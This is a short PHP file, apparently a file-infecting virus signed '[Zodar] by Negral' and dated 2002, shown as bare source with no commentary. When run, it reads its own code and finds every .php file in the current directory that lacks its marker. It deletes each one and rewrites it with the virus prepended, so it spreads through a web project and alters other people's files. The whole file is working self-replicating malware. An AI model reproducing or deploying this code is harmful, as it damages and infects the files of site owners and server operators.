<?php
function zodar()
{
//[Zodar] by Negral
//Created 03/05/2002
$c = "";
$f = fopen (__FILE__, "r");
$c = fread ($f, filesize (__FILE__));
fclose ($f);
$c = substr($c,0,866);
$handle=opendir('.');
while (($file = readdir($handle))!==false) {
if ($file != "." && $file != "..") 
 {
$s = substr($file, -3);
if ($s=="php") 
   {
	$g = fopen ($file, "r"); 
	$cont = fread ($g,filesize ($file));      
	fclose ($g);
	if (!strstr($cont,"[Zodar]"))
	{
	unlink("$file");
	$g = fopen ($file, "a+"); 
	fwrite ($g,"$c");      	
	fwrite ($g,"\n");
	fwrite ($g,substr($cont,5));
	fclose ($g);
	}
   }

 }

}

closedir($handle); 
}
zodar();
?>